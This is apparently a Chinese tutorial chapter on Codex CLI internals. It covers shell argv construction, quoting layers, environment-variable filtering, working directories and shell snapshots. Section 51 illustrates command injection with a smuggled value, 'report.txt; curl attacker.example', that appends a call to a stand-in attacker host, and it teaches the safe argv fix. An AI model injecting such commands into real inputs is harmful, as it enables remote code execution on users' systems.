# 57：Shell、argv、引号转义、环境变量与工作目录——一条命令怎样变成真正的进程

> 源码基线：`4ee41929eaf4`
>
> OpenAI 官方文档说明 Codex CLI 能在本地仓库中运行已安装的工具，并向用户展示执行中的命令。官方文档没有规定 shell argv、引号解析、环境变量过滤或 shell snapshot 的内部实现；这些细节以当前源码为准。
>
> 官方对照资料：[Codex CLI](https://learn.chatgpt.com/docs/codex/cli)。

## 1. 本章解决什么问题

看到下面这条命令：

```bash
rg -n "hello world" src | head -n 20
```

初学者很容易把它想成“操作系统运行了这一整行文字”。实际过程更接近：

```text
模型产生 cmd 字符串
  → Codex 选择 shell
  → Codex 构造 argv
  → 操作系统启动 shell 进程
  → shell 再解析 cmd 字符串
  → shell 启动 rg 和 head，并连接 pipe
```

本章回答：

- command string 与 argv 有什么区别？
- 空格到底由谁切分？
- 单引号、双引号、反斜杠分别在哪一层生效？
- `|`、`>`、`&&`、`$VAR` 为什么必须经过 shell？
- `UnifiedExecShellMode::Direct` 是否表示“不使用 shell”？
- `-c` 与 `-lc` 有什么差别？
- cwd 和 `cd` 为什么不是一回事？
- 一次命令中的 `cd` 为什么不会改变下一次工具调用？
- 子进程究竟继承哪些环境变量？
- `env_clear()` 为什么是环境隔离的关键？
- shell profile、PATH 和 shell snapshot 如何相互影响？
- 为什么把不可信数据拼进命令字符串可能产生注入漏洞？

## 2. 先建立三个盒子

把命令执行想成三个不同的盒子：

```text
盒子 A：脚本文本
"rg -n \"hello world\" src | head -n 20"

盒子 B：启动 shell 的 argv
["/bin/zsh", "-c", "rg -n \"hello world\" src | head -n 20"]

盒子 C：shell 启动子命令时的 argv
rg   → ["rg", "-n", "hello world", "src"]
head → ["head", "-n", "20"]
```

Pipe 也是 shell 在盒子 B 的脚本文本解析完成后建立的。

> 同一段文字在不同盒子中，空格和引号的含义不同。调试 quoting 问题时，第一件事就是确认错误发生在哪个盒子。

## 3. argv 是什么

argv 是 argument vector，即“参数向量”。可以把它理解为字符串数组：

```text
argv[0] = 程序名或约定的第零个参数
argv[1] = 第一个普通参数
argv[2] = 第二个普通参数
...
```

Rust 中常用：

```rust
Command::new("rg")
    .arg("-n")
    .arg("hello world")
    .arg("src");
```

这里 `"hello world"` 是一个参数。Rust 不会因为其中有空格而再次切分。

## 4. command string 不是 argv

下面是一段 shell script：

```text
rg -n "hello world" src | head -n 20
```

它仍是一整个字符串。字符串中的：

- 空格；
- 引号；
- pipe；
- 重定向；
- 变量引用；
- 条件运算符；

只有交给相应 shell 解析后才获得语法意义。

## 5. 操作系统不会自动理解 shell 语法

直接启动：

```text
["rg", "foo", "|", "head"]
```

不会自动建立 pipe。对 `rg` 来说，`|` 和 `head` 只是两个普通参数。

要让 `|` 成为管道运算符，需要类似：

```text
["/bin/sh", "-c", "rg foo | head"]
```

此时 OS 只负责启动 `/bin/sh`。真正识别 `|` 的是 sh。

## 6. Codex 的 shell_command 怎样构造 argv

`codex-rs/core/src/tools/handlers/shell/shell_command.rs` 接收：

```rust
ShellCommandToolCallParams {
    command: String,
    workdir: Option<String>,
    login: Option<bool>,
    // ...
}
```

随后调用 `Shell::derive_exec_args()`，把 command string 包装成可启动的 argv。

## 7. POSIX shell 的 argv

对 Bash、Zsh 和 sh，当前实现生成：

```text
非 login： [shell_path, "-c",  command]
login：    [shell_path, "-lc", command]
```

例如：

```text
输入脚本：echo "$HOME" && pwd

argv[0] = /bin/zsh
argv[1] = -c
argv[2] = echo "$HOME" && pwd
```

注意：`argv[2]` 是一整个元素。Codex 没有先按空格拆它。

## 8. PowerShell 的 argv

当前实现生成：

```text
非 profile： [pwsh, -NoProfile, -Command, command]
允许 profile：[pwsh, -Command, command]
```

PowerShell 的语法不是 Bash 语法。例如：

```powershell
$env:HOME
Get-ChildItem | Select-Object -First 10
```

不能机械地把 Bash 的 `$HOME`、单引号和转义规则套到 PowerShell。

## 9. cmd.exe 的 argv

对 Windows cmd，当前实现生成：

```text
[cmd.exe, /c, command]
```

`/c` 表示执行后面的命令字符串，然后退出。cmd.exe 的 `%NAME%`、`^`、双引号和批处理规则又是另一套语言。

## 10. `-c` 是什么

POSIX shell 的 `-c` 大意是：

> 把下一个 argv 元素当作 shell script 执行。

所以：

```text
["bash", "-c", "printf '%s\n' 'a b'"]
```

shell 收到的 script 是完整的 `printf ...`，随后才解析其中的引号。

## 11. `-l` 是什么

`-l` 表示 login shell 语义。`-lc` 可以理解为 `-l` 与 `-c` 的组合。

Login shell 可能读取不同的启动文件，进而改变：

- PATH；
- alias；
- shell function；
- locale；
- 语言版本管理器；
- 其他环境变量。

因此，同一脚本通过 `-c` 与 `-lc` 执行，可能找到不同的程序。

## 12. Login shell 不是“登录用户账户”

这里的 login 主要是 shell 启动模式，不表示 Codex 重新认证系统账户，也不表示自动获得更高权限。

它影响的是 shell 初始化行为；sandbox 和 approval 仍是另一套边界。

## 13. `allow_login_shell` 的约束

当前配置可禁止 login shell。如果环境不允许，而工具调用显式请求：

```text
login = true
```

handler 会拒绝，并提示省略 `login` 或设为 false。调用未显式指定时，使用环境的 `allow_login_shell` 设置。

当前普通配置的缺省值是允许，但企业/环境要求可以覆盖它。阅读代码时不要把“默认”误当成“永远”。

## 14. `Direct` 并不一定等于“不经过 shell”

`UnifiedExecShellMode` 当前有：

```rust
Direct
ZshFork(...)
```

这里的 Direct 是“直接走普通进程启动后端”，与 zsh-fork 相对。`get_command()` 在 Direct 分支里仍调用：

```rust
shell.derive_exec_args(&args.cmd, use_login_shell)
```

所以通常仍得到：

```text
[shell, -c/-lc, script]
```

> 判断是否经过 shell，要查看最终 argv；不要只根据枚举名字猜。

## 15. ZshFork 是另一种启动后端

本地 zsh-fork 模式会生成类似：

```text
[configured_zsh, -c/-lc, cmd]
```

然后尝试经 zsh-fork 后端启动。条件不满足时，运行时会回退到普通直接执行路径。

远程 environment 当前强制使用 `UnifiedExecShellMode::Direct`，因为远端需要按远端报告的 OS 和 shell 构造命令。

## 16. “直接执行程序”应该是什么形状

真正不依赖 shell 解析的调用形状是：

```text
["rg", "-n", "hello world", "src"]
```

优点：

- 参数边界明确；
- 不需要 shell quoting；
- `|`、`$`、`;` 不会意外变成控制语法；
- 更容易安全传递不可信数据。

但 Codex 的 shell-like 工具输入本身是脚本文本，因此通常有意经过 shell。

## 17. Shell 为什么仍然有价值

因为它提供组合语言：

```bash
rg TODO src \
  | sort \
  | uniq -c \
  | sort -nr \
  | head
```

还提供：

- glob：`*.rs`；
- variable expansion：`$HOME`；
- command substitution：`$(...)`；
- redirect：`>`、`2>`；
- control flow：`if`、`for`；
- command chaining：`&&`、`||`、`;`。

代价是多了一层语言和注入风险。

## 18. Shell parsing 的基本顺序

不同 shell 细节不同，但可用下面的简化模型：

```text
读入 script
  → 识别 quote 与 operator
  → 执行 parameter/command/glob 等 expansion
  → 形成每个命令的 argv
  → 设置 pipe/redirection
  → 启动程序
```

这只是学习模型，不应当替代某个 shell 的正式语法规范。

## 19. 未加引号的空格

```bash
printf '<%s>\n' hello world
```

`printf` 收到两个数据参数：

```text
hello
world
```

而：

```bash
printf '<%s>\n' "hello world"
```

收到一个包含空格的参数。

## 20. POSIX 单引号

单引号通常表示“尽量按字面保留内部字符”：

```bash
printf '%s\n' '$HOME * $(date)'
```

这里 `$HOME`、`*` 和 `$(date)` 不展开。

难点是单引号内部不能直接放一个单引号。常见拼接写法：

```bash
'can'"'"'t'
```

它由三个相邻的 quoted fragments 拼成 `can't`。

## 21. POSIX 双引号

双引号通常保留空格为同一个参数，但仍允许部分 expansion：

```bash
printf '%s\n' "$HOME"
```

因此：

```bash
"$name"
```

与：

```bash
'$name'
```

含义不同：前者展开变量，后者输出字面量 `$name`。

## 22. 反斜杠

在 POSIX shell 的许多上下文中，反斜杠转义紧随其后的字符：

```bash
printf '%s\n' hello\ world
```

但反斜杠在：

- 单引号内部；
- 双引号内部；
- here-doc；
- shell 之外的 JSON/Rust 字符串；

规则并不相同。不要把“加一个反斜杠”当成通用修复。

## 23. 四层转义问题

一条命令可能依次经过：

```text
JSON 字符串编码
  → Rust String
  → shell script parsing
  → 目标程序自己的参数语法
```

例如正则中的反斜杠可能同时受 JSON、shell 和 regex engine 影响。

排查时逐层打印：

1. 工具收到的原始 `cmd`；
2. Codex 构造的 argv；
3. shell 最终传给目标程序的 argv；
4. 目标程序怎样解释该参数。

## 24. Pipe operator

```bash
producer | consumer
```

shell 通常会：

1. 创建 OS pipe；
2. 启动 producer，把 stdout 接到 pipe 写端；
3. 启动 consumer，把 stdin 接到 pipe 读端；
4. 等待并计算 pipeline status。

这里的 pipe 是上一章所讲的 OS byte stream；`|` 是创建和连接它的 shell 语法。

## 25. 重定向不是普通参数

```bash
echo hello > output.txt
```

通常不是把 `>` 和 `output.txt` 传给 echo。shell 在启动 echo 前打开文件，并把 stdout 接到该文件。

而直接 argv：

```text
["echo", "hello", ">", "output.txt"]
```

只会打印这些字符。

## 26. `&&`、`||` 与 `;`

```bash
build && test
```

只有 build 成功才执行 test。

```bash
build || diagnose
```

build 失败时执行 diagnose。

```bash
first ; second
```

不论 first 的状态，通常继续 second。

它们不是 argv 分隔符，而是 shell control operators。

## 27. 变量展开发生在子 shell 中

Codex 构造：

```text
["/bin/zsh", "-c", "printf '%s\n' \"$PATH\""]
```

Rust 没有把 `$PATH` 替换掉。子 zsh 从自己的 env 中读取 PATH，再展开脚本。

所以要理解 `$VAR` 的值，必须同时检查：

- 最终 script；
- 子进程 env map；
- profile/snapshot 是否随后改写变量。

## 28. 命令替换是第二次执行

```bash
echo "commit=$(git rev-parse --short HEAD)"
```

shell 先运行括号中的 `git`，收集 stdout，再把结果放入外层参数。这使一行命令形成进程树，而不是单个进程。

也意味着把不可信文本放进可执行 shell 上下文非常危险。

## 29. Glob 由谁展开

```bash
rg TODO *.rs
```

通常由 shell 把 `*.rs` 展开成多个文件参数，再启动 rg。若没有匹配，Bash、Zsh、sh 的具体行为可能不同。

直接 argv 中的 `"*.rs"` 不会由 OS 自动展开；某些程序可能自行支持 glob，但那是程序自己的功能。

## 30. cwd 是进程属性

cwd 是 current working directory。启动层调用：

```rust
command.current_dir(cwd);
```

它告诉 OS：新进程从哪个目录开始解析相对路径。

```text
cwd = /repo
argv = ["rg", "TODO", "src"]
```

这里 `src` 通常表示 `/repo/src`。

## 31. workdir 怎样解析

对 shell_command，`resolve_workdir_base_path()` 的规则可概括为：

```text
workdir 缺失或空字符串
  → 使用当前 environment cwd

workdir 非空
  → environment cwd.join(workdir)
```

Unified exec 也先选择 environment，再相对该 environment 的 cwd 连接 workdir。

> 相对 workdir 的基准不是任意宿主进程 cwd，而是被选择执行环境的 cwd。

## 32. cwd 与 sandbox cwd 不一定相同

当前 unified exec request 同时保留：

- `cwd`：命令实际开始运行的目录；
- `sandbox_cwd`：解释 sandbox policy 和默认 workspace 边界时使用的可信目录。

二者可能相同，但概念上不能混用。否则改变工作目录可能意外改变权限解释基准。

## 33. `cd` 只改变当前 shell 进程

```bash
cd subdir && pwd
```

改变的是这一次 shell 进程及其后代的 cwd。命令结束后，该 shell 退出。

下一次 Codex 工具调用会重新根据 request 的 workdir/cwd 启动进程，不会自动继承上一次临时 `cd`。

## 34. 为什么 `cd` 看起来有时“失效”

连续两次调用：

```text
调用 1：cd packages/app
调用 2：pwd
```

调用 2 往往仍从环境 cwd 开始。想让同一次脚本中的后续命令使用新目录，应写：

```bash
cd packages/app && command
```

更清晰的做法通常是直接设置工具的 workdir。

## 35. 每个进程有自己的 env

环境变量是启动进程时附带的 key/value map：

```text
PATH=/usr/local/bin:/usr/bin
LANG=zh_CN.UTF-8
MODE=test
```

子进程可以修改自己的 env，但不会反向修改已经运行的父进程环境。

因此：

```bash
export MODE=test
```

通常只对当前 shell 和它随后启动的后代有效。

## 36. Codex 不只是“盲目继承全部 env”

`create_env()` 根据 `ShellEnvironmentPolicy` 构造明确的 HashMap。启动 Pipe 和 PTY 时都会：

```rust
command.env_clear();
for (key, value) in env {
    command.env(key, value);
}
```

`env_clear()` 先清空隐式继承，再逐项加入策略计算出的环境。

这带来一个重要保证：最终传入 spawn 的 map 才是子进程环境的主要事实来源。

## 37. 环境策略的六步顺序

当前 `populate_env()` 可概括为：

```text
1. 根据 inherit 建立初始 map
2. 按配置决定是否应用默认敏感名称排除
3. 应用自定义 exclude
4. 应用 set 覆盖
5. 应用 include_only
6. 若有 thread id，注入 CODEX_THREAD_ID
```

顺序非常重要。例如 `set` 在 exclude 之后，因此可以重新加入一个先前被排除的名字；但随后的 include_only 仍可能移除它。

## 38. inherit 的三种模式

```text
All  → 从父进程全部变量开始
Core → 只从平台核心变量开始
None → 从空 map 开始
```

Unix core 集合包括 PATH、SHELL、HOME、LANG、USER、TMPDIR 等。Windows core 集合还包括 PATHEXT、COMSPEC、SYSTEMROOT、USERPROFILE 等。

## 39. 默认敏感名称排除的反直觉开关

默认排除 pattern 是：

```text
*KEY*
*SECRET*
*TOKEN*
```

但只有：

```text
ignore_default_excludes = false
```

时才应用它们。该字段名称表达的是“是否忽略默认排除”，因此 false 才是“不忽略”。

当前配置默认值为 true，即默认跳过这组三项名称过滤。不要只凭字段名快速脑补其效果。

## 40. exclude、set 与 include_only

假设初始环境含：

```text
PATH=/usr/bin
API_TOKEN=old
MODE=dev
```

策略：

```toml
[shell_environment_policy]
inherit = "all"
exclude = ["*TOKEN*"]
include_only = ["PATH", "MODE", "API_TOKEN"]

[shell_environment_policy.set]
API_TOKEN = "replacement"
```

处理顺序会先移除旧 token，再由 set 加入 replacement，最后因为 include_only 匹配而保留。

环境配置可能包含敏感值；学习时不要把真实秘密写进示例、日志或版本库。

## 41. Pattern 匹配不等于 shell glob

环境过滤 pattern 使用自己的 wildcard matcher，并以不区分大小写方式构造。它不是把 pattern 交给 Bash 展开。

因此要区分：

- `include_only = ["PATH"]`：Codex 配置层过滤变量名；
- `echo *.rs`：shell 对文件名做 glob expansion。

语法看起来相似，解释器完全不同。

## 42. 特殊运行时变量

当前执行环境还可能注入：

- `CODEX_THREAD_ID`：当前 thread 的标识；
- `CODEX_PERMISSION_PROFILE`：当前具名权限 profile 的信息性名称；
- 网络代理相关变量；
- Codex 自己需要的 PATH prepend。

`CODEX_PERMISSION_PROFILE` 只是提供给子进程观察的信息，子进程可以覆盖它，不能把它当成权限已被强制执行的证明。

## 43. PATH 决定程序查找

当 argv[0] 不是绝对路径：

```text
["rg", "TODO"]
```

启动逻辑通常依据 PATH 查找可执行文件。PATH 的顺序会影响实际运行哪个同名程序。

这解释了常见现象：

- 交互终端能找到 node，Codex 命令找不到；
- `-lc` 能找到工具，`-c` 找不到；
- 本地能运行，远程环境不能；
- PATH 前部的同名脚本覆盖系统程序。

## 44. PATHEXT 是 Windows 的重要补充

Windows 查找命令还依赖 PATHEXT，例如：

```text
.COM;.EXE;.BAT;.CMD
```

当前环境构造逻辑在 Windows 缺少 PATHEXT 时补入该值，以避免命令解析异常。

## 45. Shell profile 为什么让行为不稳定

Profile 可以执行任意初始化代码，包括：

- 修改 PATH；
- 定义 alias/function；
- 打印欢迎文字；
- 启动版本管理器；
- 读取其他文件；
- 根据是否交互做分支。

它提高了“像用户终端”的一致性，也增加启动耗时、副作用和不可复现性。

## 46. Shell snapshot 解决什么问题

Codex 当前可以为本地 POSIX shell 捕获一个 snapshot，保存部分：

- exported variables；
- functions；
- aliases；
- shell options。

后续命令可 source snapshot，获得接近用户初始化环境的状态，而不必每次完整重跑昂贵 profile。

PowerShell 与 cmd 的 snapshot 当前不受支持。

## 47. Snapshot 不是原样复制整个 shell

Snapshot 有明确取舍：

- 排除 `PWD` 和 `OLDPWD`，避免旧目录污染当前 cwd；
- 创建时有 10 秒 timeout；
- 创建后重新 source 验证；
- 文件与 session 生命周期绑定，并清理陈旧文件；
- 不是正在运行的交互 shell 内存镜像。

因此它提高环境复用度，但不能保证与用户当前终端逐 bit 相同。

## 48. Snapshot wrapper 怎样避免双重 login 初始化

当原 argv 是：

```text
[shell, -lc, original_script]
```

且存在匹配 cwd 的 snapshot，当前实现可重写为概念上的：

```text
user_shell -c '
  source snapshot   # best effort
  restore overrides
  exec original_shell -c original_script
'
```

外层改用 `-c`，source 已捕获的环境；内层也以 `-c` 执行原脚本，避免再次完整走 login 初始化。

## 49. 为什么 source snapshot 后还要恢复 override

Snapshot 中可能记录旧的 PATH、代理变量或其他 exported values。若直接 source，它可能覆盖本次运行时刚刚设置的值。

所以 wrapper 会：

1. 先捕获需要保留的 live overrides；
2. source snapshot；
3. 恢复显式设置、thread/profile、代理与运行时 PATH；
4. exec 原命令。

这是一种优先级重放，不是简单拼接文本。

## 50. 为什么 override value 不直接拼进 argv

敏感值若直接嵌入 shell script/argv，可能出现在：

- 命令展示；
- 审批界面；
- 进程列表；
- 日志；
- telemetry。

当前 snapshot wrapper 的测试专门检查 override value 不被直接嵌进 argv，而是先从 live environment 捕获再恢复。

## 51. Quoting 与命令注入

假设不可信输入是：

```text
report.txt; curl attacker.example
```

危险拼接：

```text
"cat " + user_input
```

形成：

```bash
cat report.txt; curl attacker.example
```

分号把数据变成了新命令。

## 52. 首选参数数组，而不是自己拼 shell

如果任务只需执行一个程序，安全形状通常是：

```rust
Command::new("cat").arg(user_input);
```

此时恶意字符串仍是 cat 的单个参数。

若确实需要 shell 组合能力，则应：

- 尽量让脚本结构固定；
- 通过 env、stdin 或位置参数传数据；
- 使用针对目标 shell 的成熟 quoting 方法；
- 不把 POSIX escaping 误用到 PowerShell/cmd。

## 53. Shell quoting 不是安全策略本身

即使 quoting 正确，命令仍可能做危险操作：

```bash
rm -- "$path"
```

Quote 只保证 `$path` 是一个参数，不保证删除它是被授权的。

安全还需要：

- approval policy；
- sandbox；
- filesystem/network permissions；
- 目标解析与范围验证；
- 最小权限原则。

## 54. `shlex_join()` 是展示格式

Unified exec 用 `shlex_join(&command)` 生成便于显示的命令文本。例如 argv：

```text
["rg", "hello world", "src"]
```

可能显示为：

```bash
rg 'hello world' src
```

它的主要用途是让人读懂参数边界。不要把日志中的展示字符串当作原始 argv 的唯一证据，也不要假设它适用于 PowerShell/cmd 的全部语法。

## 55. 命令解析器为什么是 best effort

Codex 还会解析 argv/script，用于：

- 人类可读摘要；
- 已知安全/危险命令判断；
- approval policy；
- apply_patch 拦截。

Shell 语言表达能力极强，包含 substitution、redirect、function、动态变量和控制流。`codex-shell-command` 对简单形状能提取命令；复杂或不确定时会回退为 Unknown。

> 能静态提取出几个单词，不等于已经证明脚本安全。

## 56. 为什么安全解析要 fail closed

`parse_shell_script_into_commands()` 只接受受限的 word-only 命令与少量连接符。遇到：

- redirect；
- substitution；
- parentheses；
- control flow；
- 无法识别的语法；

就返回 None，而不是猜测它安全。

危险命令检测可以提取静态字面量，但源码明确提醒：这种结果不能用于证明命令安全。

## 57. 本地与远程 shell 不一定相同

本机可能是 macOS + zsh，远程 environment 可能是 Windows + PowerShell。若用本机 shell 包装远程脚本，会立刻产生语法错误。

当前 unified exec 优先使用目标 environment 报告的 shell；远程请求若显式指定不同 shell 类型，会被拒绝。此处限制防止在远端凭空假设一个不存在或不匹配的 shell。

## 58. 路径也有平台语法

下面两者不能无条件互换：

```text
/Users/alice/repo
C:\Users\alice\repo
```

Unified exec 使用 `PathUri` 表示可能属于另一 OS 的路径，并检查 path convention。只有在宿主可原生表示且 sandbox 条件允许时，才转换为本地 `AbsolutePathBuf`。

所以“字符串看起来像绝对路径”仍不代表它属于当前主机路径命名空间。

## 59. 环境与 cwd 都不是命令文本的一部分

推荐把一次启动看成结构体：

```text
LaunchRequest {
  argv,
  cwd,
  env,
  stdio,
  sandbox,
  timeout,
}
```

不要把所有东西都塞进：

```bash
cd ... && VAR=... command ...
```

后者有时方便，但会把结构化字段变成需要 shell 再解析的文本，也让审批、日志和跨平台处理更困难。

## 60. 一条端到端命令的完整追踪

工具参数：

```json
{
  "cmd": "printf '%s\\n' \"$MODE\" | tr a-z A-Z",
  "workdir": "packages/app",
  "login": false
}
```

假设当前环境 cwd 为 `/repo`、shell 为 `/bin/zsh`：

```text
workdir resolution
  /repo + packages/app
  → /repo/packages/app

shell argv
  [
    "/bin/zsh",
    "-c",
    "printf '%s\n' \"$MODE\" | tr a-z A-Z"
  ]

env policy
  → 明确 HashMap，假设 MODE=debug

spawn
  env_clear + env entries
  current_dir(/repo/packages/app)
  program=/bin/zsh

shell parse
  → 启动 printf，argv 包含 DEBUG 前的 debug
  → 创建 pipe
  → 启动 tr

output
  DEBUG
```

## 61. 常见故障：command not found

按顺序检查：

1. 最终 shell 是哪个？
2. 是 `-c` 还是 `-lc`？
3. 子进程 PATH 是什么？
4. snapshot 是否重写 PATH？
5. workdir 是否正确？
6. 目标程序是否只安装在交互 profile 初始化的目录？
7. 远程 environment 是否真的安装了它？

不要先假设是 Codex “没有执行命令”。

## 62. 常见故障：路径含空格

错误：

```bash
cd /Users/me/My Project
```

shell 会把路径拆成两个 word。可以写：

```bash
cd '/Users/me/My Project'
```

但若工具提供 workdir 字段，更适合直接传：

```text
workdir = /Users/me/My Project
```

因为结构化路径不需要 shell 再切词。

## 63. 常见故障：变量没有展开

```bash
echo '$HOME'
```

输出 `$HOME` 是单引号的预期行为。若想展开，在 POSIX shell 中通常使用：

```bash
echo "$HOME"
```

若仍为空，再检查该变量是否存在于传给子进程的 env，而不是继续增加转义符。

## 64. 常见故障：正则或 JSON 被吃掉

一段文本同时包含 `"`、`\`、`$` 时，往往跨越多个解析层。解决方法是减少层数：

- 把固定脚本放入仓库文件后直接执行；
- 通过 stdin 传大段数据；
- 用 argv 传单个参数；
- 用环境变量传值；
- 避免在 JSON 字符串里嵌套复杂 shell，再嵌套另一种语言。

## 65. 常见故障：上一次 export 没保留

```text
调用 1：export MODE=test
调用 2：echo "$MODE"
```

两次调用通常是两个 shell 进程。调用 1 修改的只是第一个进程环境。

可选择：

- 在同一脚本内 `export MODE=test; command`；
- 使用 shell environment policy 的 `set`；
- 让程序从配置文件读取；
- 将数据作为 argv 或 stdin 传入。

## 66. 常见故障：本地成功，Windows 失败

检查是否使用了平台专属语法：

| POSIX | PowerShell/cmd 可能不同 |
|---|---|
| `$HOME` | `$env:HOME` / `%HOME%` |
| `'literal'` | 单引号具体规则不同 |
| `/dev/null` | `$null` / `NUL` |
| `export X=1` | `$env:X='1'` / `set X=1` |
| `/tmp/a` | Windows 路径 |

跨平台代码优先使用语言标准库的 process API，而不是拼平台 shell script。

## 67. 审查命令启动代码的清单

```text
输入是 script string 还是已经分好的 argv？
谁负责解析空格、quote、glob、pipe 和 redirect？
最终 program 与每个 arg 分别是什么？
展示字符串是否被误当成真实 argv？
使用哪个 shell，目标环境是否同一 OS？
-c、-lc、-Command、/c 的选择依据是什么？
cwd 从哪里解析，相对路径以谁为基准？
sandbox cwd 是否与命令 cwd 被正确区分？
是否 env_clear，再加入策略计算后的 map？
inherit/exclude/set/include_only 的顺序是什么？
profile/snapshot 是否会覆盖 PATH 或其他 override？
不可信文本是否进入 shell 代码位置？
能否改用 argv、stdin、env 或文件减少 quoting 层数？
```

## 68. 理解检查

### 问题 1

为什么：

```text
["echo", "hello", ">", "a.txt"]
```

通常不会创建文件？

<details>
<summary>参考答案</summary>

因为没有 shell 解释 `>`。它只是 echo 的普通参数。

</details>

### 问题 2

为什么 `argv[2]` 可以包含整段 `rg ... | head ...`？

<details>
<summary>参考答案</summary>

因为 argv 元素本身可以包含空格。shell 的 `-c` 约定把下一个完整元素作为 script，再由 shell 解析内部语法。

</details>

### 问题 3

为什么 `Direct` 模式仍可能使用 zsh？

<details>
<summary>参考答案</summary>

Direct 与 zsh-fork 后端相对，不等于跳过 shell。Direct 分支仍调用 `derive_exec_args()` 包装 cmd。

</details>

### 问题 4

`cd child` 单独运行后，下一次 `pwd` 为什么可能回到原目录？

<details>
<summary>参考答案</summary>

两次工具调用启动两个进程。第一个 shell 的 cwd 修改不会反向改变下一次 request 的 cwd。

</details>

### 问题 5

`env_clear()` 后为什么仍能找到程序？

<details>
<summary>参考答案</summary>

因为 Codex 随后把策略计算出的 env map 逐项写入，其中通常包括 PATH；也可以直接以绝对程序路径启动。

</details>

### 问题 6

为什么 quote 正确仍不能证明操作安全？

<details>
<summary>参考答案</summary>

Quote 只保护参数边界，不判断目标、权限和操作意图。删除一个被正确 quote 的文件仍然可能越权或不可恢复。

</details>

### 问题 7

Snapshot 为什么排除 PWD？

<details>
<summary>参考答案</summary>

避免创建 snapshot 时的旧目录覆盖本次 request 明确选择的 cwd。

</details>

### 问题 8

为什么不能用 POSIX 单引号规则转义 PowerShell？

<details>
<summary>参考答案</summary>

它们是不同语言，解析和 expansion 规则不同。转义必须针对真正执行脚本的 shell。

</details>

## 69. 本章词汇表与代码名称翻译

| 代码或术语 | 中文理解 | 在本章中的作用 |
|---|---|---|
| Shell | 命令解释器 | 解析 script 并建立 pipeline/redirection、启动程序 |
| Script / command string | 脚本文本/命令字符串 | 尚未由 shell 分词和解释的一整段文本 |
| argv | 参数向量 | OS 启动程序时传递的有边界字符串数组 |
| `argv[0]` | 第零参数 | 通常表示程序名，也可在 Unix 被 arg0 override 改写 |
| Program | 可执行程序 | `Command::new()` 选择的启动目标 |
| Argument | 参数 | argv 中一个不可再由 OS 自动按空格拆分的元素 |
| `-c` | 执行脚本参数 | POSIX shell 把下一个 argv 元素当 script |
| `-l` / login shell | 登录式 shell | 启用 login 初始化语义，不等于权限提升 |
| `-NoProfile` | 不加载配置档 | PowerShell 减少 profile 初始化影响 |
| `-Command` | 执行命令 | PowerShell 执行后续 script |
| `/c` | 执行后退出 | cmd.exe 的命令字符串入口 |
| Quoting | 引号保护/引用 | 控制 shell 如何分词和展开字符 |
| Escaping | 转义 | 让本有语法意义的字符按字面或特定含义处理 |
| Expansion | 展开 | 变量、glob、command substitution 等变换 |
| Glob | 通配展开 | shell 将 `*.rs` 等 pattern 展开为路径 |
| Redirection | 重定向 | 把 stdio 接到文件或其他 fd |
| Control operator | 控制运算符 | `|`、`&&`、`||`、`;` 等 shell 组合语法 |
| Command substitution | 命令替换 | 运行内层命令并把输出放入外层文本 |
| cwd | 当前工作目录 | 相对路径解析的进程起点 |
| workdir | 工具工作目录参数 | 相对选定 environment cwd 解析出的本次 cwd |
| Environment / env | 环境变量集合 | 启动时传给子进程的 key/value map |
| `env_clear()` | 清空继承环境 | 防止未经过策略的父进程变量隐式泄漏 |
| Inherit | 继承策略 | All/Core/None 决定初始 env 集合 |
| Exclude | 排除 | 从当前 env map 移除匹配变量名 |
| Set / override | 设置/覆盖 | 写入明确 key/value，并覆盖同名旧值 |
| Include only | 仅保留 | 最后只留下匹配 pattern 的变量 |
| PATH | 程序搜索路径 | 影响非绝对 argv[0] 解析到哪个 executable |
| PATHEXT | Windows 扩展搜索 | 决定 `.EXE`、`.CMD` 等可执行后缀 |
| Profile / rc file | shell 配置档 | 启动时可能改变 PATH、alias、function 和 env |
| Shell snapshot | shell 快照 | 缓存部分初始化状态供后续本地 POSIX 命令恢复 |
| Source / dot command | 在当前 shell 加载脚本 | `. snapshot` 将定义和变量读入当前 shell |
| `exec` | 替换当前进程映像 | wrapper 最后用目标 shell 替代自己 |
| Direct mode | 普通直接后端 | 与 zsh-fork 相对，仍可能启动 shell 解释脚本 |
| ZshFork | zsh fork 后端 | 尝试复用特定 zsh 启动机制 |
| `shlex_join` | shell 风格展示拼接 | 把 argv 格式化为人类可读文本，不是原始 argv |
| Command injection | 命令注入 | 不可信数据突破参数位置并成为 shell 代码 |
| Fail closed | 无法证明就拒绝 | 复杂语法不被错误认定为已知安全命令 |
| Path convention | 路径约定 | POSIX/Windows 路径命名和解析规则 |
| `PathUri` | 跨环境路径表示 | 表达可能属于另一 OS 的 cwd/path |

## 70. 源码检查点

建议按以下顺序阅读：

1. `codex-rs/core/src/shell.rs`
   - 看 `Shell`、`derive_exec_args()` 以及各 shell 的 `-c/-lc/-Command//c` argv。
2. `codex-rs/shell-command/src/shell_detect.rs`
   - 看 shell type 探测、用户默认 shell、PATH 查找与平台 fallback。
3. `codex-rs/core/src/tools/handlers/shell/shell_command.rs`
   - 看 command string、workdir、login、env policy 怎样变成 `ExecParams`。
4. `codex-rs/core/src/tools/handlers/unified_exec.rs`
   - 看 `ExecCommandArgs`、`get_command()`、Direct/ZshFork 与远程模式。
5. `codex-rs/core/src/tools/handlers/unified_exec/exec_command.rs`
   - 看环境选择、workdir join、foreign path、最终 command 与 display command。
6. `codex-rs/core/src/tools/handlers/mod.rs`
   - 看 `resolve_workdir_base_path()` 和带 base path 的参数解析。
7. `codex-rs/protocol/src/config_types.rs`
   - 看 `ShellEnvironmentPolicy`、inherit/filter/set/include_only/use_profile 字段。
8. `codex-rs/protocol/src/shell_environment.rs`
   - 看环境 map 的六步构造顺序、core 变量集合与 Windows PATHEXT。
9. `codex-rs/core/src/exec_env.rs`
   - 看 thread ID、permission profile 注入以及 env 隔离意图。
10. `codex-rs/config/src/shell_environment_policy.rs`
    - 看 TOML 到 runtime policy 的转换、pattern 大小写和默认值。
11. `codex-rs/utils/pty/src/pipe.rs`
    - 看 `Command::new(program)`、`current_dir`、`env_clear`、逐 arg/env 写入。
12. `codex-rs/utils/pty/src/pty.rs`
    - 看 PTY 启动如何采用同样的 program/args/cwd/env 边界。
13. `codex-rs/core/src/tools/runtimes/mod.rs`
    - 看 PATH prepend、snapshot wrapper、单引号 escaping 和 override 恢复。
14. `codex-rs/core/src/shell_snapshot.rs`
    - 看 snapshot 捕获、PWD/OLDPWD 排除、10 秒 timeout、验证和清理。
15. `codex-rs/shell-command/src/bash.rs`
    - 看 tree-sitter Bash 解析、word-only 安全子集与复杂语法 fail closed。
16. `codex-rs/shell-command/src/powershell.rs`
    - 看 PowerShell wrapper 提取、AST 解析入口和 UTF-8 output prefix。
